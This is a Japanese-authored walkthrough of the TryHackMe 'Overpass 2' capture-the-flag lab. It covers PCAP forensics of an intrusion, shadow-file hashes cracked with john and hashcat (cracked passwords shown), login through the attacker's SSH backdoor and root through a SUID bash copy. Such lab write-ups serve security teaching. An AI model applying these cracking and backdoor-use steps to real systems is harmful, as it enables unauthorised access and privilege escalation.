## Overpass 2
https://tryhackme.com/room/overpass2hacked

## Task 1

### What was the URL of the page they used to upload a reverse shell?
![image](https://user-images.githubusercontent.com/6504854/191254699-6774acbc-b6eb-433a-b43a-22690172b560.png)

🏴 Frame 14

/development/upload.php

### What payload did the attacker use to gain access?
![image](https://user-images.githubusercontent.com/6504854/191255059-5fa765e2-041f-4b9d-a02b-4678a1ba71c7.png)

![image](https://user-images.githubusercontent.com/6504854/191255232-b5fb4f36-e8a0-495d-b6c6-3f14ff09eb8d.png)

🏴 Frame 14->follow->TCP

### What password did the attacker use to privesc?
![image](https://user-images.githubusercontent.com/6504854/191256165-5afe8917-1263-484c-8bfd-8da913dbf7af.png)

![image](https://user-images.githubusercontent.com/6504854/191256341-77e703af-ced4-4536-a387-52166359004f.png)

🏴 Frame 96->follow->TCP

### How did the attacker establish persistence?
![image](https://user-images.githubusercontent.com/6504854/191256836-33912838-cb81-4eba-82c3-b95d53ae6d4a.png)

### Using the fasttrack wordlist, how many of the system passwords were crackable?
![image](https://user-images.githubusercontent.com/6504854/191257016-7e8f4cdd-42b9-4689-b783-b5083825fc75.png)

```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

🏴 I found 5 hashes in /etc/shadow file and saved hash1.txt.

```
john hash1.txt --wordlist=/data/src/wordlists/fasttrack.txt 
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
secret12         (bee)
abcd123          (szymex)
1qaz2wsx         (muirland)
secuirty3        (paradox)
```

## Task 2
### What's the default hash for the backdoor?
![image](https://user-images.githubusercontent.com/6504854/191260073-563089cd-c17a-48ed-90d5-d4ce7bd13233.png)

### What's the hardcoded salt for the backdoor?
![image](https://user-images.githubusercontent.com/6504854/191260306-1ce62a1e-591d-46d7-8c56-e533835edf0f.png)

### What was the hash that the attacker used? - go back to the PCAP for this!
![image](https://user-images.githubusercontent.com/6504854/191260570-e7667bae-46f5-49d4-939f-19bdb7e960da.png)

### Crack the hash using rockyou and a cracking tool of your choice. What's the password?
#### HINT It's salted, so make sure you use the correct mode. This also means crackstation etc won't work.
![image](https://user-images.githubusercontent.com/6504854/191261181-543ff94b-ebec-4a0c-bb67-55a2a6737bd3.png)
```
echo '6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05' > hash.txt
hashcat --force -m 1710 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 

hashcat (v5.1.0) starting...

OpenCL Platform #1: The pocl project
====================================
* Device #1: pthread-Intel(R) Core(TM) i7-4800MQ CPU @ 2.70GHz, 1024/3144 MB allocatable, 2MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash
* Uses-64-Bit

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256
                                                                                                                                                                                      
ATTENTION! Pure (unoptimized) OpenCL kernels selected.
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=2 -D VENDOR_ID=64 -D CUDA_ARCH=0 -D AMD_ROCM=0 -D VECT_SIZE=4 -D DEVICE_TYPE=2 -D DGST_R0=14 -D DGST_R1=15 -D DGST_R2=6 -D DGST_R3=7 -D DGST_ELEM=16 -D KERN_TYPE=1710 -D _unroll'                                                                                          
* Device #1: Kernel m01710_a0-pure.dcb403f5.kernel not found in cache! Building may take a while...
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
                                                 
```
🏴 james's pass is november16

## Task 3
![image](https://user-images.githubusercontent.com/6504854/191261921-a139f6ee-d7ea-4d16-80c7-177aace9f9a8.png)

🏴 ssh-back-door sets lport = 2222
```
ssh 10.10.120.188 -p 2222

james@overpass-production:/home/james/ssh-backdoor$ ls -la

james@overpass-production:/home/james/ssh-backdoor$ ls /home
bee  james  muirland  paradox  szymex

james@overpass-production:/home/james/ssh-backdoor$ cd /home/james

james@overpass-production:/home/james$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www

james@overpass-production:/home/james$ cat user.txt
thm{d1*********************************}

james@overpass-production:/home/james$ file .suid_bash
.suid_bash: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=12f73d7a8e226c663034529c8dd20efec22dde54, stripped

james@overpass-production:/home/james$ ./.suid_bash -p
.suid_bash-4.4# cat /root/root.txt

thm{d5*********************************}
```

Congratrations! Happy Hacking 😄

コマンドとか引用されたら嫌なので、しばらくプラベで潜伏してた😄


